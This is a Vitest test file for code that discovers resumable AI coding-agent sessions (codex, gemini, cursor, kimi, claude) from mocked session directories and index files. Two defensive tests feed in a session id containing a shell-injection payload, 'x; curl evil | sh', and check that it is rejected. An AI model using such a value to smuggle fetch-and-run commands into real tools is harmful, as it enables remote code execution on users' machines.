// @vitest-environment node
import { describe, it, expect, vi, beforeEach } from "vitest";

const logWarn = vi.hoisted(() => vi.fn());
vi.mock("@/lib/logger", () => ({
  createLogger: () => ({ warn: logWarn }),
}));

// Mock the fs module the discovery uses for the generic (non-claude) path.
const readdir = vi.fn();
const readFile = vi.fn();
const stat = vi.fn();
vi.mock("node:fs/promises", () => ({
  readdir: (...args: unknown[]) => readdir(...args),
  readFile: (...args: unknown[]) => readFile(...args),
  stat: (...args: unknown[]) => stat(...args),
}));

// Mock the claude streaming parser delegate.
const listSessions = vi.fn();
vi.mock("@/services/claude-session-service", () => ({
  listSessions: (...args: unknown[]) => listSessions(...args),
}));

import {
  discoverLatestSessionId,
  listSessionIds,
  listResumableSessions,
} from "../session-id-discovery";

beforeEach(() => {
  readdir.mockReset();
  readFile.mockReset();
  stat.mockReset();
  listSessions.mockReset();
  logWarn.mockReset();
});

describe("discoverLatestSessionId — generic providers", () => {
  it("returns the newest file stem under CODEX_HOME for codex", async () => {
    readdir.mockResolvedValue(["old.jsonl", "newest.jsonl"]);
    stat.mockImplementation((p: string) =>
      Promise.resolve({ mtimeMs: p.includes("newest") ? 2000 : 1000 }),
    );

    const id = await discoverLatestSessionId("codex", "/proj", { CODEX_HOME: "/fake/codex" });
    expect(id).toBe("newest");
    expect(readdir).toHaveBeenCalledWith("/fake/codex");
  });

  it("strips json/jsonl extensions to recover the bare native id", async () => {
    readdir.mockResolvedValue(["abc-123.json"]);
    stat.mockResolvedValue({ mtimeMs: 5 });
    const id = await discoverLatestSessionId("gemini", "/proj", { GEMINI_HOME: "/g" });
    expect(id).toBe("abc-123");
  });

  it("returns null for antigravity (no resume support)", async () => {
    const id = await discoverLatestSessionId("antigravity", "/proj", {});
    expect(id).toBeNull();
    expect(readdir).not.toHaveBeenCalled();
  });

  it("returns null when the provider dir cannot be read", async () => {
    readdir.mockRejectedValue(new Error("ENOENT"));
    const id = await discoverLatestSessionId("opencode", "/proj", { OPENCODE_HOME: "/missing" });
    expect(id).toBeNull();
  });

  it("rejects a shell-injecting id and relaunches fresh (defense-in-depth)", async () => {
    // A maliciously-named session file would be typed into a tmux send-keys
    // prompt; its stem contains spaces/`;`/`|` → must be skipped, not resumed.
    readdir.mockResolvedValue(["x; curl evil | sh.jsonl"]);
    stat.mockResolvedValue({ mtimeMs: 100 });
    const id = await discoverLatestSessionId("codex", "/proj", { CODEX_HOME: "/c" });
    expect(id).toBeNull();
  });

  it("skips unsafe ids but still returns a newer safe one", async () => {
    readdir.mockResolvedValue(["bad name$.jsonl", "good-id-1.jsonl"]);
    // The unsafe file is newest; the safe one is older. Filtering must drop the
    // unsafe entry and fall through to the safe id rather than returning null.
    stat.mockImplementation((p: string) =>
      Promise.resolve({ mtimeMs: p.includes("bad") ? 200 : 100 }),
    );
    const id = await discoverLatestSessionId("codex", "/proj", { CODEX_HOME: "/c" });
    expect(id).toBe("good-id-1");
  });
});

describe("Cursor project-scoped chat-index discovery", () => {
  it("finds matching conversations across Cursor workspace buckets, newest first", async () => {
    const projectPath = "/Users/dev/my repo/.worktrees/task";
    readdir.mockImplementation((path: string) => {
      if (path === "/cursor-data/chats") {
        return Promise.resolve(["workspace-a", "workspace-b"]);
      }
      if (path === "/cursor-data/chats/workspace-a") {
        return Promise.resolve([
          "old-chat",
          "new-chat",
          "wrong-cwd",
          "empty-chat",
          "unsafe;chat",
        ]);
      }
      if (path === "/cursor-data/chats/workspace-b") {
        return Promise.resolve(["other-workspace-chat"]);
      }
      return Promise.reject(new Error(`unexpected readdir: ${path}`));
    });
    readFile.mockImplementation((path: string) => {
      const metadata = path.includes("new-chat")
        ? { cwd: projectPath, hasConversation: true, updatedAtMs: 2000 }
        : path.includes("old-chat")
          ? { cwd: projectPath, hasConversation: true, updatedAtMs: 1000 }
          : path.includes("other-workspace-chat")
            ? { cwd: projectPath, hasConversation: true, updatedAtMs: 1500 }
            : path.includes("wrong-cwd")
              ? { cwd: "/another/project", hasConversation: true, updatedAtMs: 3000 }
              : { cwd: projectPath, hasConversation: false, updatedAtMs: 4000 };
      return Promise.resolve(JSON.stringify(metadata));
    });

    const list = await listSessionIds(
      "cursor",
      projectPath,
      { CURSOR_DATA_DIR: "/cursor-data" },
      3,
    );

    expect(readdir).toHaveBeenCalledWith("/cursor-data/chats");
    expect(readFile).toHaveBeenCalledWith(
      "/cursor-data/chats/workspace-a/new-chat/meta.json",
      "utf8",
    );
    expect(readFile).not.toHaveBeenCalledWith(
      "/cursor-data/chats/workspace-a/unsafe;chat/meta.json",
      "utf8",
    );
    expect(list.map((entry) => entry.sessionId)).toEqual([
      "new-chat",
      "other-workspace-chat",
      "old-chat",
    ]);
    expect(logWarn).not.toHaveBeenCalled();
  });

  it("warns when every discovered chat uses unreadable or unknown metadata", async () => {
    readdir.mockImplementation((path: string) =>
      Promise.resolve(path === "/cursor-data/chats" ? ["opaque-bucket"] : ["chat-1"]),
    );
    readFile.mockResolvedValue(JSON.stringify({ project: "/proj", resumable: true }));

    await expect(
      listSessionIds("cursor", "/proj", { CURSOR_DATA_DIR: "/cursor-data" }),
    ).resolves.toEqual([]);
    expect(logWarn).toHaveBeenCalledWith(
      "Cursor chat metadata was unreadable or had an unknown schema",
      { candidateCount: 1 },
    );
  });

  it("rejects unsafe Cursor chat directory names", async () => {
    readdir.mockImplementation((path: string) =>
      Promise.resolve(path === "/cursor-data/chats" ? ["workspace-a"] : ["bad;chat"]),
    );

    await expect(
      discoverLatestSessionId("cursor", "/project", {
        CURSOR_DATA_DIR: "/cursor-data",
      }),
    ).resolves.toBeNull();
    expect(readFile).not.toHaveBeenCalled();
  });

  it("does not apply shell-id filtering to opaque workspace bucket names", async () => {
    readdir.mockImplementation((path: string) =>
      Promise.resolve(path === "/cursor-data/chats" ? ["workspace%2Fhash=+"] : ["safe-chat"]),
    );
    readFile.mockResolvedValue(
      JSON.stringify({ cwd: "/project", hasConversation: true, updatedAtMs: 42 }),
    );

    await expect(
      discoverLatestSessionId("cursor", "/project", {
        CURSOR_DATA_DIR: "/cursor-data",
      }),
    ).resolves.toBe("safe-chat");
    expect(readFile).toHaveBeenCalledWith(
      "/cursor-data/chats/workspace%2Fhash=+/safe-chat/meta.json",
      "utf8",
    );
  });

  it("falls back from an out-of-range metadata timestamp without dropping valid chats", async () => {
    readdir.mockImplementation((path: string) =>
      Promise.resolve(path === "/cursor-data/chats" ? ["workspace"] : ["bad-time", "good"]),
    );
    readFile.mockImplementation((path: string) =>
      Promise.resolve(
        JSON.stringify({
          cwd: "/project",
          hasConversation: true,
          updatedAtMs: path.includes("bad-time") ? Number.MAX_VALUE : 2000,
        }),
      ),
    );
    stat.mockResolvedValue({ mtimeMs: 1000 });

    await expect(
      listSessionIds("cursor", "/project", { CURSOR_DATA_DIR: "/cursor-data" }),
    ).resolves.toEqual([
      { sessionId: "good", lastModified: new Date(2000).toISOString() },
      { sessionId: "bad-time", lastModified: new Date(1000).toISOString() },
    ]);
  });
});

describe("Kimi project-scoped session_index.jsonl discovery", () => {
  const indexJsonl = (records: (Record<string, unknown> | string)[]) =>
    records
      .map((r) => (typeof r === "string" ? r : JSON.stringify(r)))
      .join("\n");

  it("filters records by workDir and sorts newest-first by sessionDir mtime", async () => {
    readFile.mockResolvedValue(
      indexJsonl([
        {
          sessionId: "old-session",
          sessionDir: "/kimi-home/sessions/proj/old-session",
          workDir: "/proj",
        },
        {
          sessionId: "other-project",
          sessionDir: "/kimi-home/sessions/other/other-project",
          workDir: "/other/project",
        },
        {
          sessionId: "new-session",
          sessionDir: "/kimi-home/sessions/proj/new-session",
          workDir: "/proj",
        },
      ]),
    );
    stat.mockImplementation((p: string) =>
      Promise.resolve({
        mtimeMs: p.includes("new-session") ? 2000 : p.includes("old-session") ? 1000 : 500,
      }),
    );

    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });

    expect(readFile).toHaveBeenCalledWith("/kimi-home/session_index.jsonl", "utf8");
    expect(list).toEqual([
      { sessionId: "new-session", lastModified: new Date(2000).toISOString() },
      { sessionId: "old-session", lastModified: new Date(1000).toISOString() },
    ]);
  });

  it("tolerates malformed lines and records with missing fields", async () => {
    readFile.mockResolvedValue(
      indexJsonl([
        "not json at all",
        "{broken json",
        { sessionDir: "/kimi-home/sessions/proj/no-id", workDir: "/proj" },
        { sessionId: "no-workdir", sessionDir: "/kimi-home/sessions/proj/no-workdir" },
        { sessionId: 42, sessionDir: "/kimi-home/sessions/proj/numeric", workDir: "/proj" },
        {
          sessionId: "good-session",
          sessionDir: "/kimi-home/sessions/proj/good-session",
          workDir: "/proj",
        },
        "",
      ]),
    );
    stat.mockResolvedValue({ mtimeMs: 1000 });

    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });

    expect(list.map((entry) => entry.sessionId)).toEqual(["good-session"]);
  });

  it("rejects shell-unsafe session ids from the index (defense-in-depth)", async () => {
    readFile.mockResolvedValue(
      indexJsonl([
        {
          sessionId: "x; curl evil | sh",
          sessionDir: "/kimi-home/sessions/proj/evil",
          workDir: "/proj",
        },
      ]),
    );
    stat.mockResolvedValue({ mtimeMs: 100 });

    await expect(
      discoverLatestSessionId("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" }),
    ).resolves.toBeNull();
  });

  it("falls back to index append order when sessionDir mtimes are unavailable", async () => {
    // The index is append-only, so later lines are newer. With no stat-able
    // sessionDir (and one record missing sessionDir entirely), discovery must
    // return the ids newest-first by file order.
    readFile.mockResolvedValue(
      indexJsonl([
        { sessionId: "first", workDir: "/proj" },
        {
          sessionId: "second",
          sessionDir: "/kimi-home/sessions/proj/second",
          workDir: "/proj",
        },
        {
          sessionId: "third",
          sessionDir: "/kimi-home/sessions/proj/third",
          workDir: "/proj",
        },
      ]),
    );
    stat.mockRejectedValue(new Error("ENOENT"));

    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });

    expect(list.map((entry) => entry.sessionId)).toEqual(["third", "second", "first"]);
  });

  it("sorts mixed mtime/missing-mtime records deterministically, true newest first", async () => {
    // Review case: A mtime 5000 idx 0, B no mtime idx 1, C mtime 100 idx 2.
    // The old comparator mixed per-pair criteria (mtime when both present,
    // else reverse index order), which is non-transitive — V8's TimSort could
    // order this cycle as C/B/A, burying the true newest (A) outside the
    // head/limit slice. The transitive comparator must yield A, C, B.
    readFile.mockResolvedValue(
      indexJsonl([
        { sessionId: "a", sessionDir: "/kimi-home/sessions/proj/a", workDir: "/proj" },
        { sessionId: "b", workDir: "/proj" }, // no sessionDir → no mtime
        { sessionId: "c", sessionDir: "/kimi-home/sessions/proj/c", workDir: "/proj" },
      ]),
    );
    stat.mockImplementation((p: string) => {
      if (p.endsWith("session_index.jsonl")) return Promise.resolve({ mtimeMs: 7000 });
      if (p.endsWith("/a")) return Promise.resolve({ mtimeMs: 5000 });
      if (p.endsWith("/c")) return Promise.resolve({ mtimeMs: 100 });
      return Promise.reject(new Error("ENOENT"));
    });

    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });

    expect(list).toEqual([
      { sessionId: "a", lastModified: new Date(5000).toISOString() },
      { sessionId: "c", lastModified: new Date(100).toISOString() },
      // B sorts oldest (missing mtime = -Infinity) even though its lastModified
      // falls back to the index file's mtime.
      { sessionId: "b", lastModified: new Date(7000).toISOString() },
    ]);
  });

  it("collapses re-appended duplicate sessionIds to the newest occurrence within limit", async () => {
    // The index is append-only: "dup" was re-appended on update (idx 2, mtime
    // 3000) after its original row (idx 0, mtime 1000). The picker keys rows
    // by sessionId, so the id must appear exactly once — as the newest row.
    readFile.mockResolvedValue(
      indexJsonl([
        { sessionId: "dup", sessionDir: "/kimi-home/sessions/proj/dup-old", workDir: "/proj" },
        { sessionId: "other", sessionDir: "/kimi-home/sessions/proj/other", workDir: "/proj" },
        { sessionId: "dup", sessionDir: "/kimi-home/sessions/proj/dup-new", workDir: "/proj" },
      ]),
    );
    stat.mockImplementation((p: string) => {
      if (p.endsWith("session_index.jsonl")) return Promise.resolve({ mtimeMs: 9000 });
      if (p.endsWith("/dup-old")) return Promise.resolve({ mtimeMs: 1000 });
      if (p.endsWith("/other")) return Promise.resolve({ mtimeMs: 2000 });
      if (p.endsWith("/dup-new")) return Promise.resolve({ mtimeMs: 3000 });
      return Promise.reject(new Error("ENOENT"));
    });

    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" }, 10);

    expect(list).toEqual([
      { sessionId: "dup", lastModified: new Date(3000).toISOString() },
      { sessionId: "other", lastModified: new Date(2000).toISOString() },
    ]);
    // Dedup happens before the slice, so a limit never truncates to duplicates
    // or drops a unique session in favour of one.
    const limited = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" }, 1);
    expect(limited).toEqual([
      { sessionId: "dup", lastModified: new Date(3000).toISOString() },
    ]);
  });

  it("never leaks Date(0)/1970 into results when every stat fails", async () => {
    // Session dirs AND the index file itself are unstat-able: lastModified
    // must be omitted entirely rather than falling back to the epoch.
    readFile.mockResolvedValue(
      indexJsonl([
        { sessionId: "no-dir-stat", sessionDir: "/kimi-home/sessions/proj/x", workDir: "/proj" },
        { sessionId: "no-dir", workDir: "/proj" },
      ]),
    );
    stat.mockRejectedValue(new Error("ENOENT"));

    const list = await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });

    expect(list.map((entry) => entry.sessionId)).toEqual(["no-dir", "no-dir-stat"]);
    for (const entry of list) {
      expect(entry.lastModified).toBeUndefined();
    }
    expect(JSON.stringify(list)).not.toContain("1970");
  });

  it("honours the KIMI_CODE_HOME override", async () => {
    readFile.mockResolvedValue(
      indexJsonl([
        { sessionId: "s1", sessionDir: "/custom-kimi/sessions/p/s1", workDir: "/proj" },
      ]),
    );
    stat.mockResolvedValue({ mtimeMs: 1000 });

    await listSessionIds("kimi", "/proj", { KIMI_CODE_HOME: "/custom-kimi" });

    expect(readFile).toHaveBeenCalledWith("/custom-kimi/session_index.jsonl", "utf8");
  });

  it("defaults to $HOME/.kimi-code when KIMI_CODE_HOME is unset", async () => {
    readFile.mockResolvedValue(
      indexJsonl([
        { sessionId: "s1", sessionDir: "/home/u/.kimi-code/sessions/p/s1", workDir: "/proj" },
      ]),
    );
    stat.mockResolvedValue({ mtimeMs: 1000 });

    await listSessionIds("kimi", "/proj", { HOME: "/home/u" });

    expect(readFile).toHaveBeenCalledWith("/home/u/.kimi-code/session_index.jsonl", "utf8");
  });

  it("returns [] when the index file cannot be read", async () => {
    readFile.mockRejectedValue(new Error("ENOENT"));

    await expect(
      listResumableSessions("kimi", "/proj", { KIMI_CODE_HOME: "/missing" }),
    ).resolves.toEqual([]);
  });

  it("yields id + timestamp (no preview) through the picker shape", async () => {
    readFile.mockResolvedValue(
      indexJsonl([
        {
          sessionId: "kimi-sess-1",
          sessionDir: "/kimi-home/sessions/proj/kimi-sess-1",
          workDir: "/proj",
        },
      ]),
    );
    stat.mockResolvedValue({ mtimeMs: 1000 });

    const list = await listResumableSessions("kimi", "/proj", { KIMI_CODE_HOME: "/kimi-home" });

    expect(list).toHaveLength(1);
    expect(list[0].sessionId).toBe("kimi-sess-1");
    expect(list[0].firstUserMessage).toBeUndefined();
    expect(list[0].gitBranch).toBeUndefined();
  });
});

describe("discoverLatestSessionId — claude delegates to listSessions", () => {
  it("uses the streaming parser and returns its newest sessionId", async () => {
    listSessions.mockResolvedValue([
      { sessionId: "claude-uuid-1", lastModified: "2026-06-03T00:00:00.000Z" },
    ]);
    const id = await discoverLatestSessionId("claude", "/proj", {
      CLAUDE_CONFIG_DIR: "/profiles/p1/.config",
    });
    expect(id).toBe("claude-uuid-1");
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 1,
      profileConfigDir: "/profiles/p1/.config",
    });
  });
});

describe("listSessionIds", () => {
  it("returns newest-first list for generic providers", async () => {
    readdir.mockResolvedValue(["a.jsonl", "b.jsonl", "c.jsonl"]);
    stat.mockImplementation((p: string) =>
      Promise.resolve({ mtimeMs: p.includes("a") ? 30 : p.includes("b") ? 20 : 10 }),
    );
    const list = await listSessionIds("codex", "/proj", { CODEX_HOME: "/c" }, 2);
    expect(list.map((s) => s.sessionId)).toEqual(["a", "b"]);
  });
});

describe("listResumableSessions — picker shape", () => {
  it("preserves Claude's rich previews (firstUserMessage + gitBranch)", async () => {
    listSessions.mockResolvedValue([
      {
        sessionId: "claude-uuid-1",
        lastModified: "2026-06-03T00:00:00.000Z",
        firstUserMessage: "fix the bug",
        gitBranch: "main",
      },
    ]);
    const list = await listResumableSessions("claude", "/proj", {
      CLAUDE_CONFIG_DIR: "/profiles/p1/.config",
    });
    expect(list[0]).toMatchObject({
      sessionId: "claude-uuid-1",
      firstUserMessage: "fix the bug",
      gitBranch: "main",
    });
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 20,
      profileConfigDir: "/profiles/p1/.config",
    });
  });

  it("returns id + timestamp (no preview) for disk-discovery providers", async () => {
    readdir.mockResolvedValue(["cx-1.jsonl"]);
    stat.mockResolvedValue({ mtimeMs: 1000 });
    const list = await listResumableSessions("codex", "/proj", { CODEX_HOME: "/c" });
    expect(list).toHaveLength(1);
    expect(list[0].sessionId).toBe("cx-1");
    expect(list[0].firstUserMessage).toBeUndefined();
    expect(list[0].gitBranch).toBeUndefined();
  });

  it("empty-states (returns []) when the provider dir is unreadable", async () => {
    readdir.mockRejectedValue(new Error("ENOENT"));
    const list = await listResumableSessions("gemini", "/proj", { GEMINI_HOME: "/missing" });
    expect(list).toEqual([]);
  });

  it("returns [] for a non-resumable provider (antigravity)", async () => {
    const list = await listResumableSessions("antigravity", "/proj", {});
    expect(list).toEqual([]);
    expect(readdir).not.toHaveBeenCalled();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// [remote-dev-n4x4.6] Claude sessions run with CLAUDE_CONFIG_DIR UNSET, so
// their transcripts land in the user's real ~/.claude/projects. Discovery must
// therefore work from an env that does NOT carry the variable — the case that
// is now the norm rather than the exception.
// ─────────────────────────────────────────────────────────────────────────────

describe("claude discovery with CLAUDE_CONFIG_DIR unset (the n4x4.6 default)", () => {
  it("passes profileConfigDir: undefined so listSessions falls back to ~/.claude", async () => {
    listSessions.mockResolvedValue([
      { sessionId: "claude-uuid-shared", lastModified: "2026-07-28T00:00:00.000Z" },
    ]);

    const id = await discoverLatestSessionId("claude", "/proj", {});

    expect(id).toBe("claude-uuid-shared");
    // undefined — NOT "" and NOT an explicit $HOME/.claude. claude-session-service
    // maps undefined to homedir()/.claude, which is where Claude actually wrote.
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 1,
      profileConfigDir: undefined,
    });
  });

  it("lists resumable sessions from the shared config dir", async () => {
    listSessions.mockResolvedValue([
      {
        sessionId: "claude-uuid-shared",
        lastModified: "2026-07-28T00:00:00.000Z",
        firstUserMessage: "ship the thing",
        gitBranch: "master",
      },
    ]);

    const list = await listResumableSessions("claude", "/proj", {});

    expect(list[0]).toMatchObject({
      sessionId: "claude-uuid-shared",
      firstUserMessage: "ship the thing",
    });
    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 20,
      profileConfigDir: undefined,
    });
  });

  it("still honours an explicit CLAUDE_CONFIG_DIR (legacy sessions, other tools)", async () => {
    // A session created BEFORE n4x4.6 has the variable in its resume binding;
    // its transcripts really are under the profile dir, so discovery must keep
    // using it rather than silently reading the shared dir.
    listSessions.mockResolvedValue([
      { sessionId: "legacy-uuid", lastModified: "2026-01-01T00:00:00.000Z" },
    ]);

    await discoverLatestSessionId("claude", "/proj", {
      CLAUDE_CONFIG_DIR: "/profiles/p1",
    });

    expect(listSessions).toHaveBeenCalledWith("/proj", {
      limit: 1,
      profileConfigDir: "/profiles/p1",
    });
  });
});
